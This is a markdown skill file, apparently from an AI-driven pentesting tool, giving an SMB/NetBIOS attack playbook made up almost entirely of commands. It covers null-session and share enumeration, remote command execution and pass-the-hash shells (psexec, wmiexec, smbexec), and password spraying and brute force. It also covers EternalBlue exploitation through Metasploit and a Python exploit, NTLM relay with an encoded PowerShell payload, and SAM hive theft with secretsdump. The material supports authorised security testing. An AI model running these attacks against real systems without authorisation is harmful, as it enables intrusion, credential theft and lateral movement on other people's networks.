<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: smb
description: SMB/NetBIOS security testing — null session, share enumeration, EternalBlue, pass-the-hash, relay attacks, crackmapexec, smbclient, and SMB-specific CVEs
---

# SMB / NetBIOS Security Testing

SMB (Server Message Block) = Windows file sharing protocol. Critical attack surface: null sessions, share enumeration, EternalBlue (MS17-010), pass-the-hash, NTLM relay, and credential brute force.

**Install:**
```
sudo apt-get install -y smbclient smbmap crackmapexec enum4linux-ng rpcclient impacket-scripts
pip install impacket --break-system-packages
# netexec (newer crackmapexec):
pip install netexec --break-system-packages
```

**Ports:** 139 (NetBIOS), 445 (SMB direct)

---

## Reconnaissance

    nmap -p 139,445 <target> -sV --open
    nmap -p 445 <target> --script smb-security-mode,smb-enum-shares,smb-vuln-ms17-010

    # OS + version detection:
    crackmapexec smb <target>
    # Returns: OS version, hostname, domain, signing status

---

## Null Session / Anonymous Access

    # smbclient — null session (no credentials):
    smbclient -L //<target>/ -N             # List shares, no password
    smbclient //<target>/share -N           # Connect to share

    # smbmap — check share permissions:
    smbmap -H <target>                      # Null session
    smbmap -H <target> -u "" -p ""         # Explicit null

    # enum4linux-ng — comprehensive enumeration:
    enum4linux-ng <target>                  # All info (users, shares, policies)
    enum4linux-ng -A <target>               # All checks

    # rpcclient — null session:
    rpcclient -U "" -N <target>
    rpcclient> enumdomusers                 # List domain users
    rpcclient> enumdomgroups                # List groups
    rpcclient> querydominfo                 # Domain info
    rpcclient> netshareenum                # Shares

---

## Authenticated Enumeration

    # smbclient with credentials:
    smbclient -L //<target>/ -U "domain\\username%password"
    smbclient //<target>/C$ -U "admin%password"   # Admin share

    # smbmap:
    smbmap -H <target> -u username -p password
    smbmap -H <target> -u username -p password -r sharename    # Recursive list
    smbmap -H <target> -u username -p password --download 'sharename\path\file.txt'

    # crackmapexec:
    crackmapexec smb <target> -u username -p password --shares
    crackmapexec smb <target> -u username -p password --users
    crackmapexec smb <target> -u username -p password --groups
    crackmapexec smb <target> -u username -p password --sessions
    crackmapexec smb <target> -u username -p password -x "whoami"   # Execute command

---

## Pass-the-Hash (PTH)

NTLM authentication can use hash directly — no plaintext password needed:

    # smbclient with NTLM hash:
    smbclient //<target>/C$ -U "administrator" --pw-nt-hash <NTLM_hash>

    # crackmapexec PTH:
    crackmapexec smb <target> -u administrator -H <NTLM_hash>
    crackmapexec smb <target> -u administrator -H <NTLM_hash> -x "whoami"

    # impacket psexec (full shell):
    psexec.py administrator@<target> -hashes :<NTLM_hash>

    # impacket wmiexec:
    wmiexec.py administrator@<target> -hashes :<NTLM_hash>

    # impacket smbexec:
    smbexec.py administrator@<target> -hashes :<NTLM_hash>

---

## Brute Force

    # crackmapexec credential spray:
    crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success
    crackmapexec smb <target> -u administrator -p /usr/share/wordlists/rockyou.txt

    # hydra:
    hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://<target>

---

## EternalBlue — MS17-010 (Windows 7/2008R2 without patch)

    # Check vulnerability:
    nmap -p 445 --script smb-vuln-ms17-010 <target>
    crackmapexec smb <target> -M ms17-010

    # Metasploit:
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS <target>
    set LHOST <attacker>
    run

    # Python exploit (no Metasploit):
    # git clone https://github.com/helviojunior/MS17-010 /home/pentester/tools/MS17-010
    python3 /home/pentester/tools/MS17-010/send_and_execute.py <target> shell.exe

---

## SMB Relay Attack (NTLM Relay)

If SMB signing is DISABLED on target (common on workstations):

    # Step 1: Check signing status:
    crackmapexec smb <network>/24 --gen-relay-list relay_targets.txt
    nmap -p 445 --script smb-security-mode <target> | grep "message signing"

    # Step 2: Setup Responder (capture NTLM hashes):
    # Edit /etc/responder/Responder.conf → SMB = Off, HTTP = Off (relay mode)
    sudo responder -I eth0 -dwP

    # Step 3: Relay with impacket:
    sudo ntlmrelayx.py -tf relay_targets.txt -smb2support
    # When victim authenticates → relay to target → get shell or dump SAM

    # With command execution:
    sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -c "powershell -enc <b64_payload>"

---

## CVE Coverage

| CVE | Name | Impact |
|-----|------|--------|
| CVE-2017-0144 | EternalBlue | RCE (MS17-010) |
| CVE-2020-0796 | SMBGhost | RCE (SMBv3.1.1) |
| CVE-2021-36942 | PetitPotam | NTLM relay via EFS |
| CVE-2022-26925 | PrintNightmare (LS) | NTLM relay |

    # SMBGhost check:
    nmap -p 445 --script smb-vuln-cve-2020-0796 <target>

---

## Sensitive File Access

    # Once share access obtained:
    smbclient //<target>/C$ -U "admin%pass"
    smb> ls
    smb> get SAM                    # C:\Windows\System32\config\SAM (need SYSTEM too)
    smb> get SYSTEM
    smb> recurse ON
    smb> prompt OFF
    smb> mget *                     # Download all files

    # Secretsdump from SAM + SYSTEM:
    secretsdump.py LOCAL -sam SAM -system SYSTEM -ntds NTDS.dit

---

## Pro Tips

1. `crackmapexec smb <subnet>/24` scans entire subnet for SMB hosts and their OS versions
2. SMB signing disabled = relay attack possible — check with `crackmapexec --gen-relay-list`
3. Pass-the-hash via `crackmapexec -H` — no cracking required if you have the hash
4. `smbmap -H target -r` recursively lists all readable shares — often finds sensitive docs
5. EternalBlue still active on unpatched Windows 7/2008R2 — always check with nmap script
6. `enum4linux-ng` reveals domain users, password policies, and group memberships anonymously

## Summary

SMB testing: null session (`smbclient -N`) → share enumeration (`smbmap`, `enum4linux-ng`) → credential brute (`crackmapexec`) → pass-the-hash (`crackmapexec -H`, `psexec.py`) → EternalBlue check (`nmap smb-vuln-ms17-010`) → SMB relay if signing disabled (`ntlmrelayx.py`).
